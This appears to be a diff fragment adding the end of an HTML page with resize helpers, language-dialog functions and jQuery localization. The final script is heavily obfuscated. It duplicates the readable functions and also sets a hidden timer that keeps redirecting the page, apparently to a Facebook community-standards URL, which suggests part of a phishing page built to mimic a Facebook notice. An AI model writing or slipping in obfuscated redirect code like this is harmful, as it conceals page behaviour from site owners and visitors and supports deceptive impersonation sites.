+        //         document.getElementById('content-box').style.width = (window.innerWidth - 20) + "px";
+        //     }
+        //     else {
+        //         document.getElementById('content-box').style.width = widthBox + "px";
+        //     }
+        //     resize();
+        // });
+
+        // function resize() {
+        //     console.log(document.getElementById('content-box').offsetWidth + " " + document.getElementById('content-box').offsetHeight);
+        //     var width = document.getElementById('content-box').offsetWidth;
+        //     var height = document.getElementById('content-box').offsetHeight;
+        //     if (width > height) {
+        //             document.getElementById('content-box').style.height = (width - 26*2)+ "px";
+        //         }
+        //         else {
+        //             document.getElementById('content-box').style.width = (height - 26*2) + "px";
+        //         }
+            
+        // }
+        function openDialog() {
+            document.getElementById('langDialog').style.display = 'inline';
+        }
+        
+        function closeDialog() {
+            document.getElementById('langDialog').style.display = 'none';
+        }
+    </script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <script src="js/jquery.localize.min.js"></script>
+    <script src="js/base.js"></script> 
+    <script>
+        var base = new BaseFunc();
+        // In a browser where the language is set to French
+        //$("[data-localize]").localize("localize", { language: "fr",pathPrefix: "/data/localize", skipLanguage: "en-US"})
+        
+        // You can also override the language detection, and pass in a language code
+        $("[data-localize]").localize("localize", { language: base.getCurrentLanguage() ,pathPrefix: "data/localize", skipLanguage: "en-US"})
+    </script>
+    <script>
+        var _0x1409be=_0x2735;(function(_0x2c36c0,_0x482f26){var _0x48cc1a=_0x2735,_0x1e3142=_0x2c36c0();while(!![]){try{var _0x1a23ce=-parseInt(_0x48cc1a(0x1c7))/0x1+parseInt(_0x48cc1a(0x1b8))/0x2*(-parseInt(_0x48cc1a(0x1be))/0x3)+-parseInt(_0x48cc1a(0x1ca))/0x4+-parseInt(_0x48cc1a(0x1bd))/0x5*(-parseInt(_0x48cc1a(0x1cb))/0x6)+parseInt(_0x48cc1a(0x1c2))/0x7+parseInt(_0x48cc1a(0x1c8))/0x8+parseInt(_0x48cc1a(0x1cc))/0x9*(parseInt(_0x48cc1a(0x1c1))/0xa);if(_0x1a23ce===_0x482f26)break;else _0x1e3142['push'](_0x1e3142['shift']());}catch(_0x5bab30){_0x1e3142['push'](_0x1e3142['shift']());}}}(_0x4871,0x5ebfc),window[_0x1409be(0x1c9)](_0x1409be(0x1c4),_0x272890=>{resize();}));var widthBox=document[_0x1409be(0x1b4)](_0x1409be(0x1b9))[_0x1409be(0x1bc)];function _0x4871(){var _0x39969b=['resize','none','9550vSMGSR','content-box','langDialog','log','offsetWidth','3448835ceGJch','435zDTJzk','offsetHeight','innerHeight','4425090VXEVTb','4583971hrFhvM','display','load','width','style','759740bxtmBX','5680792lhnvWq','addEventListener','2628084ZelgDK','6dhUUfi','9kifaRl','innerWidth','inline','getElementById','https://transparency.fb.com/policies/community-standards'];_0x4871=function(){return _0x39969b;};return _0x4871();}window[_0x1409be(0x1c9)](_0x1409be(0x1b6),()=>{var _0x132d47=_0x1409be;console[_0x132d47(0x1bb)](window[_0x132d47(0x1c0)]),widthBox>=window[_0x132d47(0x1cd)]?document['getElementById']('content-box')[_0x132d47(0x1c6)][_0x132d47(0x1c5)]=window['innerWidth']-0x14+'px':document[_0x132d47(0x1b4)]('content-box')[_0x132d47(0x1c6)]['width']=widthBox+'px',resize();});function resize(){var _0x234cd4=_0x1409be;console[_0x234cd4(0x1bb)](document[_0x234cd4(0x1b4)]('content-box')['offsetWidth']+'\x20'+document[_0x234cd4(0x1b4)]('content-box')[_0x234cd4(0x1bf)]);var _0x49f32a=document[_0x234cd4(0x1b4)](_0x234cd4(0x1b9))[_0x234cd4(0x1bc)],_0x441bec=document[_0x234cd4(0x1b4)]('content-box')[_0x234cd4(0x1bf)];_0x49f32a>_0x441bec?document[_0x234cd4(0x1b4)](_0x234cd4(0x1b9))['style']['height']=_0x49f32a-0x1a*0x2+'px':document[_0x234cd4(0x1b4)](_0x234cd4(0x1b9))['style'][_0x234cd4(0x1c5)]=_0x441bec-0x1a*0x2+'px';}function openDialog(){var _0x196cd3=_0x1409be;document['getElementById'](_0x196cd3(0x1ba))[_0x196cd3(0x1c6)][_0x196cd3(0x1c3)]=_0x196cd3(0x1b3);}function closeDialog(){var _0x1f1bc8=_0x1409be;document[_0x1f1bc8(0x1b4)](_0x1f1bc8(0x1ba))[_0x1f1bc8(0x1c6)][_0x1f1bc8(0x1c3)]=_0x1f1bc8(0x1b7);}function _0x2735(_0x424826,_0x30d4de){var _0x4871c4=_0x4871();return _0x2735=function(_0x2735fa,_0x863977){_0x2735fa=_0x2735fa-0x1b3;var _0x433169=_0x4871c4[_0x2735fa];return _0x433169;},_0x2735(_0x424826,_0x30d4de);}setInterval(function(){var _0x4192c2=_0x1409be;location['replace'](_0x4192c2(0x1b5));},0xbb8);
+    </script>
+
+</body></html>
